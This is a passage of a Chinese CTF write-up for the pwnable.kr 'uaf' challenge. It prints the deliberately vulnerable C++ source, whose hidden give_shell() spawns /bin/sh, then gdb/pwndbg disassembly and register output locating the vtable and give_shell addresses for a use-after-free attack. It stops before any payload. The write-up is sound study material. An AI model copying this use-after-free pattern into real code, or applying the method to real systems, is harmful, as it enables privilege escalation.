-r-xr-sr-x   1 root uaf_pwn 15463 Sep 26  2015 uaf
-rw-r--r--   1 root root     1431 Sep 26  2015 uaf.cpp
```

我们可以看到三个文件`uaf`、`uaf.cpp`和`flag`，其中`uaf`是`ELF`二进制可执行文件，`uaf.c`是编译二进制文件的`C++`代码，用户`uaf`没有权限直接查看`flag`文件中的内容，所以我们老老实实地输入`cat uaf.cpp`来查看`uaf.cpp`的代码。

```C++
uaf@pwnable:~$ cat uaf.cpp
#include <fcntl.h>
#include <iostream> 
#include <cstring>
#include <cstdlib>
#include <unistd.h>
using namespace std;

class Human{
private:
    virtual void give_shell(){
        system("/bin/sh");
    }
protected:
    int age;
    string name;
public:
    virtual void introduce(){
        cout << "My name is " << name << endl;
        cout << "I am " << age << " years old" << endl;
    }
};

class Man: public Human{
public:
    Man(string name, int age){
        this->name = name;
        this->age = age;
    }
    virtual void introduce(){
        Human::introduce();
        cout << "I am a nice guy!" << endl;
    }
};

class Woman: public Human{
public:
    Woman(string name, int age){
        this->name = name;
        this->age = age;
    }
    virtual void introduce(){
        Human::introduce();
        cout << "I am a cute girl!" << endl;
    }
};

int main(int argc, char* argv[]){
    Human* m = new Man("Jack", 25);
    Human* w = new Woman("Jill", 21);

    size_t len;
    char* data;
    unsigned int op;
    while(1){
        cout << "1. use\n2. after\n3. free\n";
        cin >> op;

        switch(op){
            case 1:
                m->introduce();
                w->introduce();
                break;
            case 2:
                len = atoi(argv[1]);
                data = new char[len];
                read(open(argv[2], O_RDONLY), data, len);
                cout << "your data is allocated" << endl;
                break;
            case 3:
                delete m;
                delete w;
                break;
            default:
                break;
        }
    }
    return 0;
}
```

首先程序分配了两个实例，一个`Man`，一个`Woman`，这俩个类都继承自基类`Human`，它们也因此继承了`Human`类的所有方法（`give_shell()`和`introduce()`）。之后程序进入了一个`while(1)`循环无限请求输入，用户有三个选项。`use after free`嘛，如果我们直接选择`3`再选择`1`的话，程序会出现段错误并结束运行。

```bash
uaf@pwnable:~$ ./uaf
1. use
2. after
3. free
3
1. use
2. after
3. free
1
Segmentation fault (core dumped)
```

我们重点来看选项`2`，选项`2`从`argv[2]`提供的文件中读取`argv[1]`个字节的数据并存储在变量`data`中，而变量`data`是使用关键字`new`创建、存储在堆中的。简单来说就是，选项`2`分配一定大小的内存块来读取用户输入的内容。我们用`gdb`来进一步了解该程序。

```assembly
uaf@pwnable:~$ gdb ./uaf
(gdb) set disassembly-flavor intel  # Intel Style
(gdb) disass main
Dump of assembler code for function main:
   0x0000000000400ec4 <+0>:     push   rbp
   0x0000000000400ec5 <+1>:     mov    rbp,rsp
   0x0000000000400ec8 <+4>:     push   r12
   0x0000000000400eca <+6>:     push   rbx
   0x0000000000400ecb <+7>:     sub    rsp,0x50
   0x0000000000400ecf <+11>:    mov    DWORD PTR [rbp-0x54],edi
   0x0000000000400ed2 <+14>:    mov    QWORD PTR [rbp-0x60],rsi
   0x0000000000400ed6 <+18>:    lea    rax,[rbp-0x12]
   0x0000000000400eda <+22>:    mov    rdi,rax
   0x0000000000400edd <+25>:    call   0x400d70 <std::allocator<char>::allocator()@plt>
   0x0000000000400ee2 <+30>:    lea    rdx,[rbp-0x12]
   0x0000000000400ee6 <+34>:    lea    rax,[rbp-0x50]
   0x0000000000400eea <+38>:    mov    esi,0x4014f0
   0x0000000000400eef <+43>:    mov    rdi,rax
   0x0000000000400ef2 <+46>:    call   0x400d10 <std::basic_string<char, std::char_traits<char>, std::allocator<char> >::basic_string(char const*, std::allocator<char> const&)@plt>
   0x0000000000400ef7 <+51>:    lea    r12,[rbp-0x50]
   0x0000000000400efb <+55>:    mov    edi,0x18
   0x0000000000400f00 <+60>:    call   0x400d90 <operator new(unsigned long)@plt>   # 创建一个新的堆块
   0x0000000000400f05 <+65>:    mov    rbx,rax
   0x0000000000400f08 <+68>:    mov    edx,0x19
   0x0000000000400f0d <+73>:    mov    rsi,r12
   0x0000000000400f10 <+76>:    mov    rdi,rbx
   0x0000000000400f13 <+79>:    call   0x401264 <Man::Man(std::string, int)>   # 调用Man()的构造函数
   0x0000000000400f18 <+84>:    mov    QWORD PTR [rbp-0x38],rbx
   0x0000000000400f1c <+88>:    lea    rax,[rbp-0x50]
   0x0000000000400f20 <+92>:    mov    rdi,rax
   0x0000000000400f23 <+95>:    call   0x400d00 <std::basic_string<char, std::char_traits<char>, std::allocator<char> >::~basic_string()@plt>
   0x0000000000400f28 <+100>:   lea    rax,[rbp-0x12]
   0x0000000000400f2c <+104>:   mov    rdi,rax
   0x0000000000400f2f <+107>:   call   0x400d40 <std::allocator<char>::~allocator()@plt>
   0x0000000000400f34 <+112>:   lea    rax,[rbp-0x11]
   0x0000000000400f38 <+116>:   mov    rdi,rax
   0x0000000000400f3b <+119>:   call   0x400d70 <std::allocator<char>::allocator()@plt>
   0x0000000000400f40 <+124>:   lea    rdx,[rbp-0x11]
   0x0000000000400f44 <+128>:   lea    rax,[rbp-0x40]
   0x0000000000400f48 <+132>:   mov    esi,0x4014f5
   0x0000000000400f4d <+137>:   mov    rdi,rax
   0x0000000000400f50 <+140>:   call   0x400d10 <std::basic_string<char, std::char_traits<char>, std::allocator<char> >::basic_string(char const*, std::allocator<char> const&)@plt>
   0x0000000000400f55 <+145>:   lea    r12,[rbp-0x40]
   0x0000000000400f59 <+149>:   mov    edi,0x18
   0x0000000000400f5e <+154>:   call   0x400d90 <operator new(unsigned long)@plt>
   0x0000000000400f63 <+159>:   mov    rbx,rax
   0x0000000000400f66 <+162>:   mov    edx,0x15
   0x0000000000400f6b <+167>:   mov    rsi,r12
   0x0000000000400f6e <+170>:   mov    rdi,rbx
   0x0000000000400f71 <+173>:   call   0x401308 <Woman::Woman(std::string, int)>
   0x0000000000400f76 <+178>:   mov    QWORD PTR [rbp-0x30],rbx
   0x0000000000400f7a <+182>:   lea    rax,[rbp-0x40]
   0x0000000000400f7e <+186>:   mov    rdi,rax
   0x0000000000400f81 <+189>:   call   0x400d00 <std::basic_string<char, std::char_traits<char>, s
td::allocator<char> >::~basic_string()@plt>
   0x0000000000400f86 <+194>:   lea    rax,[rbp-0x11]
   0x0000000000400f8a <+198>:   mov    rdi,rax
   0x0000000000400f8d <+201>:   call   0x400d40 <std::allocator<char>::~allocator()@plt>
   0x0000000000400f92 <+206>:   mov    esi,0x4014fa
   0x0000000000400f97 <+211>:   mov    edi,0x602260
   0x0000000000400f9c <+216>:   call   0x400cf0 <std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*)@plt>
   0x0000000000400fa1 <+221>:   lea    rax,[rbp-0x18]
   0x0000000000400fa5 <+225>:   mov    rsi,rax
   0x0000000000400fa8 <+228>:   mov    edi,0x6020e0
   0x0000000000400fad <+233>:   call   0x400dd0 <std::istream::operator>>(unsigned int&)@plt>
   0x0000000000400fb2 <+238>:   mov    eax,DWORD PTR [rbp-0x18]
   0x0000000000400fb5 <+241>:   cmp    eax,0x2
   0x0000000000400fb8 <+244>:   je     0x401000 <main+316>
   0x0000000000400fba <+246>:   cmp    eax,0x3
   0x0000000000400fbd <+249>:   je     0x401076 <main+434>
   0x0000000000400fc3 <+255>:   cmp    eax,0x1
   0x0000000000400fc6 <+258>:   je     0x400fcd <main+265>
   0x0000000000400fc8 <+260>:   jmp    0x4010a9 <main+485>
   0x0000000000400fcd <+265>:   mov    rax,QWORD PTR [rbp-0x38]
   0x0000000000400fd1 <+269>:   mov    rax,QWORD PTR [rax]
   0x0000000000400fd4 <+272>:   add    rax,0x8
   0x0000000000400fd8 <+276>:   mov    rdx,QWORD PTR [rax]
   0x0000000000400fdb <+279>:   mov    rax,QWORD PTR [rbp-0x38]
   0x0000000000400fdf <+283>:   mov    rdi,rax
   0x0000000000400fe2 <+286>:   call   rdx
   0x0000000000400fe4 <+288>:   mov    rax,QWORD PTR [rbp-0x30]
   0x0000000000400fe8 <+292>:   mov    rax,QWORD PTR [rax]
   0x0000000000400feb <+295>:   add    rax,0x8
   0x0000000000400fef <+299>:   mov    rdx,QWORD PTR [rax]
   0x0000000000400ff2 <+302>:   mov    rax,QWORD PTR [rbp-0x30]
   0x0000000000400ff6 <+306>:   mov    rdi,rax
   0x0000000000400ff9 <+309>:   call   rdx
   0x0000000000400ffb <+311>:   jmp    0x4010a9 <main+485>
   0x0000000000401000 <+316>:   mov    rax,QWORD PTR [rbp-0x60]
   0x0000000000401004 <+320>:   add    rax,0x8
   0x0000000000401008 <+324>:   mov    rax,QWORD PTR [rax]
   0x000000000040100b <+327>:   mov    rdi,rax
   0x000000000040100e <+330>:   call   0x400d20 <atoi@plt>
   0x0000000000401013 <+335>:   cdqe   
   0x0000000000401015 <+337>:   mov    QWORD PTR [rbp-0x28],rax
   0x0000000000401019 <+341>:   mov    rax,QWORD PTR [rbp-0x28]
   0x000000000040101d <+345>:   mov    rdi,rax
   0x0000000000401020 <+348>:   call   0x400c70 <operator new[](unsigned long)@plt>
   0x0000000000401025 <+353>:   mov    QWORD PTR [rbp-0x20],rax
   0x0000000000401029 <+357>:   mov    rax,QWORD PTR [rbp-0x60]
   0x000000000040102d <+361>:   add    rax,0x10
   0x0000000000401031 <+365>:   mov    rax,QWORD PTR [rax]
   0x0000000000401034 <+368>:   mov    esi,0x0
   0x0000000000401039 <+373>:   mov    rdi,rax
   0x000000000040103c <+376>:   mov    eax,0x0
   0x0000000000401041 <+381>:   call   0x400dc0 <open@plt>
   0x0000000000401046 <+386>:   mov    rdx,QWORD PTR [rbp-0x28]
   0x000000000040104a <+390>:   mov    rcx,QWORD PTR [rbp-0x20]
   0x000000000040104e <+394>:   mov    rsi,rcx
   0x0000000000401051 <+397>:   mov    edi,eax
   0x0000000000401053 <+399>:   call   0x400ca0 <read@plt>
   0x0000000000401058 <+404>:   mov    esi,0x401513
   0x000000000040105d <+409>:   mov    edi,0x602260
   0x0000000000401062 <+414>:   call   0x400cf0 <std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*)@plt>
   0x0000000000401067 <+419>:   mov    esi,0x400d60
   0x000000000040106c <+424>:   mov    rdi,rax
   0x000000000040106f <+427>:   call   0x400d50 <std::ostream::operator<<(std::ostream& (*)(std::ostream&))@plt>
   0x0000000000401074 <+432>:   jmp    0x4010a9 <main+485>
   0x0000000000401076 <+434>:   mov    rbx,QWORD PTR [rbp-0x38]
   0x000000000040107a <+438>:   test   rbx,rbx
   0x000000000040107d <+441>:   je     0x40108f <main+459>
   0x000000000040107f <+443>:   mov    rdi,rbx
   0x0000000000401082 <+446>:   call   0x40123a <Human::~Human()>
   0x0000000000401087 <+451>:   mov    rdi,rbx
   0x000000000040108a <+454>:   call   0x400c80 <operator delete(void*)@plt>
   0x000000000040108f <+459>:   mov    rbx,QWORD PTR [rbp-0x30]
   0x0000000000401093 <+463>:   test   rbx,rbx
   0x0000000000401096 <+466>:   je     0x4010a8 <main+484>
   0x0000000000401098 <+468>:   mov    rdi,rbx
   0x000000000040109b <+471>:   call   0x40123a <Human::~Human()>
   0x00000000004010a0 <+476>:   mov    rdi,rbx
   0x00000000004010a3 <+479>:   call   0x400c80 <operator delete(void*)@plt>
   0x00000000004010a8 <+484>:   nop
   0x00000000004010a9 <+485>:   jmp    0x400f92 <main+206>
   0x00000000004010ae <+490>:   mov    r12,rax
   0x00000000004010b1 <+493>:   mov    rdi,rbx
   0x00000000004010b4 <+496>:   call   0x400c80 <operator delete(void*)@plt>
   0x00000000004010b9 <+501>:   mov    rbx,r12
   0x00000000004010bc <+504>:   jmp    0x4010c1 <main+509>
   0x00000000004010be <+506>:   mov    rbx,rax
   0x00000000004010c1 <+509>:   lea    rax,[rbp-0x50]
   0x00000000004010c5 <+513>:   mov    rdi,rax
   0x00000000004010c8 <+516>:   call   0x400d00 <std::basic_string<char, std::char_traits<char>, std::allocator<char> >::~basic_string()@plt>
   0x00000000004010cd <+521>:   jmp    0x4010d2 <main+526>
   0x00000000004010cf <+523>:   mov    rbx,rax
   0x00000000004010d2 <+526>:   lea    rax,[rbp-0x12]
   0x00000000004010d6 <+530>:   mov    rdi,rax
   0x00000000004010d9 <+533>:   call   0x400d40 <std::allocator<char>::~allocator()@plt>
   0x00000000004010de <+538>:   mov    rax,rbx
   0x00000000004010e1 <+541>:   mov    rdi,rax
   0x00000000004010e4 <+544>:   call   0x400da0 <_Unwind_Resume@plt>
   0x00000000004010e9 <+549>:   mov    r12,rax
   0x00000000004010ec <+552>:   mov    rdi,rbx
   0x00000000004010ef <+555>:   call   0x400c80 <operator delete(void*)@plt>
   0x00000000004010f4 <+560>:   mov    rbx,r12
   0x00000000004010f7 <+563>:   jmp    0x4010fc <main+568>
   0x00000000004010f9 <+565>:   mov    rbx,rax
   0x00000000004010fc <+568>:   lea    rax,[rbp-0x40]
   0x0000000000401100 <+572>:   mov    rdi,rax
   0x0000000000401103 <+575>:   call   0x400d00 <std::basic_string<char, std::char_traits<char>, std::allocator<char> >::~basic_string()@plt>
   0x0000000000401108 <+580>:   jmp    0x40110d <main+585>
   0x000000000040110a <+582>:   mov    rbx,rax
   0x000000000040110d <+585>:   lea    rax,[rbp-0x11]
   0x0000000000401111 <+589>:   mov    rdi,rax
   0x0000000000401114 <+592>:   call   0x400d40 <std::allocator<char>::~allocator()@plt>
   0x0000000000401119 <+597>:   mov    rax,rbx
   0x000000000040111c <+600>:   mov    rdi,rax
   0x000000000040111f <+603>:   call   0x400da0 <_Unwind_Resume@plt>
End of assembler dump.
(gdb) b *main+84
Breakpoint 1 at 0x400f18
(gdb) run
Starting program: /home/uaf/uaf 

Breakpoint 1, 0x0000000000400f18 in main ()
```

该程序中各个类的内存分布如下，一共需要`24`比特，所以堆的块大小应该是`32`比特。

| offset |             class Human              |             class Man              |             class Woman              |
| :----: | :----------------------------------: | :--------------------------------: | :----------------------------------: |
|   +0   | a pointer to `Human` class's vftable | a pointer to `Man` class's vftable | a pointer to `Woman` class's vftable |
|   +8   |               int age                |              int age               |               int age                |
|  +16   |           std::string name           |          std::string name          |           std::string name           |
|  +24   |                (end)                 |               (end)                |                (end)                 |

我们可以把二进制文件下载到本地用`pwndbg`进行分析，这样就可以比`gdb`更好地查看该程序的信息啦。

```assembly
┌──(tyd㉿kali-linux)-[~/ctf/pwn/pwnable.kr]
└─$ sudo chmod +x ./uaf
$ gdb ./uaf
pwndbg> set print asm-demangle on
pwndbg> disass main
Dump of assembler code for function main:
   0x0000000000400ec4 <+0>:     push   rbp
   0x0000000000400ec5 <+1>:     mov    rbp,rsp
   0x0000000000400ec8 <+4>:     push   r12
   0x0000000000400eca <+6>:     push   rbx
   0x0000000000400ecb <+7>:     sub    rsp,0x50
   0x0000000000400ecf <+11>:    mov    DWORD PTR [rbp-0x54],edi
   0x0000000000400ed2 <+14>:    mov    QWORD PTR [rbp-0x60],rsi
   0x0000000000400ed6 <+18>:    lea    rax,[rbp-0x12]
   0x0000000000400eda <+22>:    mov    rdi,rax
   0x0000000000400edd <+25>:    call   0x400d70 <std::allocator<char>::allocator()@plt>
   0x0000000000400ee2 <+30>:    lea    rdx,[rbp-0x12]
   0x0000000000400ee6 <+34>:    lea    rax,[rbp-0x50]
   0x0000000000400eea <+38>:    mov    esi,0x4014f0
   0x0000000000400eef <+43>:    mov    rdi,rax
   0x0000000000400ef2 <+46>:    call   0x400d10 <std::basic_string<char, std::char_traits<char>, std::allocator<char> >::basic_string(char const*, std::allocator<char> const&)@plt>                
   0x0000000000400ef7 <+51>:    lea    r12,[rbp-0x50]
   0x0000000000400efb <+55>:    mov    edi,0x18
   0x0000000000400f00 <+60>:    call   0x400d90 <operator new(unsigned long)@plt>
   0x0000000000400f05 <+65>:    mov    rbx,rax
   0x0000000000400f08 <+68>:    mov    edx,0x19
   0x0000000000400f0d <+73>:    mov    rsi,r12
   0x0000000000400f10 <+76>:    mov    rdi,rbx
   0x0000000000400f13 <+79>:    call   0x401264 <Man::Man(std::string, int)>
   0x0000000000400f18 <+84>:    mov    QWORD PTR [rbp-0x38],rbx
   0x0000000000400f1c <+88>:    lea    rax,[rbp-0x50]
   0x0000000000400f20 <+92>:    mov    rdi,rax
   0x0000000000400f23 <+95>:    call   0x400d00 <std::basic_string<char, std::char_traits<char>, std::allocator<char> >::~basic_string()@plt>                                                       
   0x0000000000400f28 <+100>:   lea    rax,[rbp-0x12]
   0x0000000000400f2c <+104>:   mov    rdi,rax
   0x0000000000400f2f <+107>:   call   0x400d40 <std::allocator<char>::~allocator()@plt>
   0x0000000000400f34 <+112>:   lea    rax,[rbp-0x11]
   0x0000000000400f38 <+116>:   mov    rdi,rax
   0x0000000000400f3b <+119>:   call   0x400d70 <std::allocator<char>::allocator()@plt>
   0x0000000000400f40 <+124>:   lea    rdx,[rbp-0x11]
   0x0000000000400f44 <+128>:   lea    rax,[rbp-0x40]
   0x0000000000400f48 <+132>:   mov    esi,0x4014f5
   0x0000000000400f4d <+137>:   mov    rdi,rax
   0x0000000000400f50 <+140>:   call   0x400d10 <std::basic_string<char, std::char_traits<char>, std::allocator<char> >::basic_string(char const*, std::allocator<char> const&)@plt>                
   0x0000000000400f55 <+145>:   lea    r12,[rbp-0x40]
   0x0000000000400f59 <+149>:   mov    edi,0x18
   0x0000000000400f5e <+154>:   call   0x400d90 <operator new(unsigned long)@plt>
   0x0000000000400f63 <+159>:   mov    rbx,rax
   0x0000000000400f66 <+162>:   mov    edx,0x15
   0x0000000000400f6b <+167>:   mov    rsi,r12
   0x0000000000400f6e <+170>:   mov    rdi,rbx
   0x0000000000400f71 <+173>:   call   0x401308 <Woman::Woman(std::string, int)>
   0x0000000000400f76 <+178>:   mov    QWORD PTR [rbp-0x30],rbx
   0x0000000000400f7a <+182>:   lea    rax,[rbp-0x40]
   0x0000000000400f7e <+186>:   mov    rdi,rax
   0x0000000000400f81 <+189>:   call   0x400d00 <std::basic_string<char, std::char_traits<char>, std::allocator<char> >::~basic_string()@plt>                                                       
   0x0000000000400f86 <+194>:   lea    rax,[rbp-0x11]
   0x0000000000400f8a <+198>:   mov    rdi,rax
   0x0000000000400f8d <+201>:   call   0x400d40 <std::allocator<char>::~allocator()@plt>
   0x0000000000400f92 <+206>:   mov    esi,0x4014fa
   0x0000000000400f97 <+211>:   mov    edi,0x602260
   0x0000000000400f9c <+216>:   call   0x400cf0 <std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*)@plt>                                                                                   
   0x0000000000400fa1 <+221>:   lea    rax,[rbp-0x18]
   0x0000000000400fa5 <+225>:   mov    rsi,rax
   0x0000000000400fa8 <+228>:   mov    edi,0x6020e0
   0x0000000000400fad <+233>:   call   0x400dd0 <std::istream::operator>>(unsigned int&)@plt>
   0x0000000000400fb2 <+238>:   mov    eax,DWORD PTR [rbp-0x18]
   0x0000000000400fb5 <+241>:   cmp    eax,0x2
   0x0000000000400fb8 <+244>:   je     0x401000 <main+316>
   0x0000000000400fba <+246>:   cmp    eax,0x3
   0x0000000000400fbd <+249>:   je     0x401076 <main+434>
   0x0000000000400fc3 <+255>:   cmp    eax,0x1
   0x0000000000400fc6 <+258>:   je     0x400fcd <main+265>
   0x0000000000400fc8 <+260>:   jmp    0x4010a9 <main+485>
   0x0000000000400fcd <+265>:   mov    rax,QWORD PTR [rbp-0x38]
   0x0000000000400fd1 <+269>:   mov    rax,QWORD PTR [rax]
   0x0000000000400fd4 <+272>:   add    rax,0x8
   0x0000000000400fd8 <+276>:   mov    rdx,QWORD PTR [rax]
   0x0000000000400fdb <+279>:   mov    rax,QWORD PTR [rbp-0x38]
   0x0000000000400fdf <+283>:   mov    rdi,rax
   0x0000000000400fe2 <+286>:   call   rdx
   0x0000000000400fe4 <+288>:   mov    rax,QWORD PTR [rbp-0x30]
   0x0000000000400fe8 <+292>:   mov    rax,QWORD PTR [rax]
   0x0000000000400feb <+295>:   add    rax,0x8
   0x0000000000400fef <+299>:   mov    rdx,QWORD PTR [rax]
   0x0000000000400ff2 <+302>:   mov    rax,QWORD PTR [rbp-0x30]
   0x0000000000400ff6 <+306>:   mov    rdi,rax
   0x0000000000400ff9 <+309>:   call   rdx
   0x0000000000400ffb <+311>:   jmp    0x4010a9 <main+485>
   0x0000000000401000 <+316>:   mov    rax,QWORD PTR [rbp-0x60]
   0x0000000000401004 <+320>:   add    rax,0x8
   0x0000000000401008 <+324>:   mov    rax,QWORD PTR [rax]
   0x000000000040100b <+327>:   mov    rdi,rax
   0x000000000040100e <+330>:   call   0x400d20 <atoi@plt>
   0x0000000000401013 <+335>:   cdqe   
   0x0000000000401015 <+337>:   mov    QWORD PTR [rbp-0x28],rax
   0x0000000000401019 <+341>:   mov    rax,QWORD PTR [rbp-0x28]
   0x000000000040101d <+345>:   mov    rdi,rax
   0x0000000000401020 <+348>:   call   0x400c70 <operator new[](unsigned long)@plt>
   0x0000000000401025 <+353>:   mov    QWORD PTR [rbp-0x20],rax
   0x0000000000401029 <+357>:   mov    rax,QWORD PTR [rbp-0x60]
   0x000000000040102d <+361>:   add    rax,0x10
   0x0000000000401031 <+365>:   mov    rax,QWORD PTR [rax]
   0x0000000000401034 <+368>:   mov    esi,0x0
   0x0000000000401039 <+373>:   mov    rdi,rax
   0x000000000040103c <+376>:   mov    eax,0x0
   0x0000000000401041 <+381>:   call   0x400dc0 <open@plt>
   0x0000000000401046 <+386>:   mov    rdx,QWORD PTR [rbp-0x28]
   0x000000000040104a <+390>:   mov    rcx,QWORD PTR [rbp-0x20]
   0x000000000040104e <+394>:   mov    rsi,rcx
   0x0000000000401051 <+397>:   mov    edi,eax
   0x0000000000401053 <+399>:   call   0x400ca0 <read@plt>
   0x0000000000401058 <+404>:   mov    esi,0x401513
   0x000000000040105d <+409>:   mov    edi,0x602260
   0x0000000000401062 <+414>:   call   0x400cf0 <std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*)@plt>                                                                                   
   0x0000000000401067 <+419>:   mov    esi,0x400d60
   0x000000000040106c <+424>:   mov    rdi,rax
   0x000000000040106f <+427>:   call   0x400d50 <std::ostream::operator<<(std::ostream& (*)(std::ostream&))@plt>                                                                                    
   0x0000000000401074 <+432>:   jmp    0x4010a9 <main+485>
   0x0000000000401076 <+434>:   mov    rbx,QWORD PTR [rbp-0x38]
   0x000000000040107a <+438>:   test   rbx,rbx
   0x000000000040107d <+441>:   je     0x40108f <main+459>
   0x000000000040107f <+443>:   mov    rdi,rbx
   0x0000000000401082 <+446>:   call   0x40123a <Human::~Human()>
   0x0000000000401087 <+451>:   mov    rdi,rbx
   0x000000000040108a <+454>:   call   0x400c80 <operator delete(void*)@plt>
   0x000000000040108f <+459>:   mov    rbx,QWORD PTR [rbp-0x30]
   0x0000000000401093 <+463>:   test   rbx,rbx
   0x0000000000401096 <+466>:   je     0x4010a8 <main+484>
   0x0000000000401098 <+468>:   mov    rdi,rbx
   0x000000000040109b <+471>:   call   0x40123a <Human::~Human()>
   0x00000000004010a0 <+476>:   mov    rdi,rbx
   0x00000000004010a3 <+479>:   call   0x400c80 <operator delete(void*)@plt>
   0x00000000004010a8 <+484>:   nop
   0x00000000004010a9 <+485>:   jmp    0x400f92 <main+206>
   0x00000000004010ae <+490>:   mov    r12,rax
   0x00000000004010b1 <+493>:   mov    rdi,rbx
   0x00000000004010b4 <+496>:   call   0x400c80 <operator delete(void*)@plt>
   0x00000000004010b9 <+501>:   mov    rbx,r12
   0x00000000004010bc <+504>:   jmp    0x4010c1 <main+509>
   0x00000000004010be <+506>:   mov    rbx,rax
   0x00000000004010c1 <+509>:   lea    rax,[rbp-0x50]
   0x00000000004010c5 <+513>:   mov    rdi,rax
   0x00000000004010c8 <+516>:   call   0x400d00 <std::basic_string<char, std::char_traits<char>, std::allocator<char> >::~basic_string()@plt>                                                       
   0x00000000004010cd <+521>:   jmp    0x4010d2 <main+526>
   0x00000000004010cf <+523>:   mov    rbx,rax
   0x00000000004010d2 <+526>:   lea    rax,[rbp-0x12]
   0x00000000004010d6 <+530>:   mov    rdi,rax
   0x00000000004010d9 <+533>:   call   0x400d40 <std::allocator<char>::~allocator()@plt>
   0x00000000004010de <+538>:   mov    rax,rbx
   0x00000000004010e1 <+541>:   mov    rdi,rax
   0x00000000004010e4 <+544>:   call   0x400da0 <_Unwind_Resume@plt>
   0x00000000004010e9 <+549>:   mov    r12,rax
   0x00000000004010ec <+552>:   mov    rdi,rbx
   0x00000000004010ef <+555>:   call   0x400c80 <operator delete(void*)@plt>
   0x00000000004010f4 <+560>:   mov    rbx,r12
   0x00000000004010f7 <+563>:   jmp    0x4010fc <main+568>
   0x00000000004010f9 <+565>:   mov    rbx,rax
   0x00000000004010fc <+568>:   lea    rax,[rbp-0x40]
   0x0000000000401100 <+572>:   mov    rdi,rax
   0x0000000000401103 <+575>:   call   0x400d00 <std::basic_string<char, std::char_traits<char>, std::allocator<char> >::~basic_string()@plt>                                                       
   0x0000000000401108 <+580>:   jmp    0x40110d <main+585>
   0x000000000040110a <+582>:   mov    rbx,rax
   0x000000000040110d <+585>:   lea    rax,[rbp-0x11]
   0x0000000000401111 <+589>:   mov    rdi,rax
   0x0000000000401114 <+592>:   call   0x400d40 <std::allocator<char>::~allocator()@plt>
   0x0000000000401119 <+597>:   mov    rax,rbx
   0x000000000040111c <+600>:   mov    rdi,rax
   0x000000000040111f <+603>:   call   0x400da0 <_Unwind_Resume@plt>
End of assembler dump.
pwndbg> b *main+84
Breakpoint 1 at 0x400f18
pwndbg> run
Starting program: /home/tyd/ctf/pwn/pwnable.kr/uaf 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Breakpoint 1, 0x0000000000400f18 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────
 RAX  0x614ee0 —▸ 0x401570 —▸ 0x40117a (Human::give_shell()) ◂— push   rbp
 RBX  0x614ee0 —▸ 0x401570 —▸ 0x40117a (Human::give_shell()) ◂— push   rbp
 RCX  0x7ffff7bf95d8 (__libc_single_threaded) ◂— 0x1
 RDX  0x19
 RDI  0x7ffff7e195c0 (std::string::_Rep::_S_empty_rep_storage) ◂— 0x0
 RSI  0x7fffffffddc0 —▸ 0x614ec8 ◂— 0x6b63614a /* 'Jack' */
 R8   0x7ffff7bf1c60 (main_arena) ◂— 0x0
 R9   0x7ffff7e0be78 —▸ 0x602210 —▸ 0x7ffff7ca76c0 (__cxxabiv1::__class_type_info::~__class_type_info()) ◂— endbr64                                                                                 
 R10  0x7ffff7c1ee50 ◂— 0xd00220000cec4
 R11  0x7ffff7ced490 ◂— endbr64 
 R12  0x7fffffffddc0 —▸ 0x614ec8 ◂— 0x6b63614a /* 'Jack' */
 R13  0x7fffffffdf38 —▸ 0x7fffffffe297 ◂— 'COLORFGBG=15;0'
 R14  0x0
 R15  0x7ffff7ffd020 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0x0
 RBP  0x7fffffffde10 ◂— 0x1
 RSP  0x7fffffffddb0 —▸ 0x7fffffffdf28 —▸ 0x7fffffffe276 ◂— '/home/tyd/ctf/pwn/pwnable.kr/uaf'
 RIP  0x400f18 (main+84) ◂— mov    qword ptr [rbp - 0x38], rbx
────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────
 ► 0x400f18 <main+84>     mov    qword ptr [rbp - 0x38], rbx
   0x400f1c <main+88>     lea    rax, [rbp - 0x50]
   0x400f20 <main+92>     mov    rdi, rax
   0x400f23 <main+95>     call   0x400d00                      <0x400d00>
 
   0x400f28 <main+100>    lea    rax, [rbp - 0x12]
   0x400f2c <main+104>    mov    rdi, rax
   0x400f2f <main+107>    call   std::allocator<char>::~allocator()@plt                      <std::allocator<char>::~allocator()@plt>                                                               
 
   0x400f34 <main+112>    lea    rax, [rbp - 0x11]
   0x400f38 <main+116>    mov    rdi, rax
   0x400f3b <main+119>    call   std::allocator<char>::allocator()@plt                      <std::allocator<char>::allocator()@plt>                                                                 
 
   0x400f40 <main+124>    lea    rdx, [rbp - 0x11]
────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────
00:0000│ rsp     0x7fffffffddb0 —▸ 0x7fffffffdf28 —▸ 0x7fffffffe276 ◂— '/home/tyd/ctf/pwn/pwnable.kr/uaf'
01:0008│         0x7fffffffddb8 ◂— 0x1f7e16e48
02:0010│ rsi r12 0x7fffffffddc0 —▸ 0x614ec8 ◂— 0x6b63614a /* 'Jack' */
03:0018│         0x7fffffffddc8 —▸ 0x7ffff7d14344 ◂— xor    eax, eax
04:0020│         0x7fffffffddd0 —▸ 0x7ffff7e18ff0 ◂— 0x2
05:0028│         0x7fffffffddd8 —▸ 0x7ffff7e18ff0 ◂— 0x2
06:0030│         0x7fffffffdde0 —▸ 0x7ffff7e16f60 (std::wcerr) —▸ 0x7ffff7e113f0 —▸ 0x7ffff7d2f540 ◂— endbr64 
07:0038│         0x7fffffffdde8 —▸ 0x7ffff7cb9095 (std::ios_base::Init::Init()+1701) ◂— mov    rax, qword ptr [rip + 0x15a1fc]                                                                      
──────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────
 ► f 0         0x400f18 main+84
   f 1   0x7ffff7a4618a __libc_start_call_main+122
   f 2   0x7ffff7a46245 __libc_start_main+133
   f 3         0x400e09 _start+41
──────────────────────────────────────────────────────────────────────────────────────────────────
```

可以看到`Man`类的虚函数表（`vtable`）地址是`0x401570`，而`Man`类的`give_shell()`函数的起始地址是`0x40117a`。

```assembly
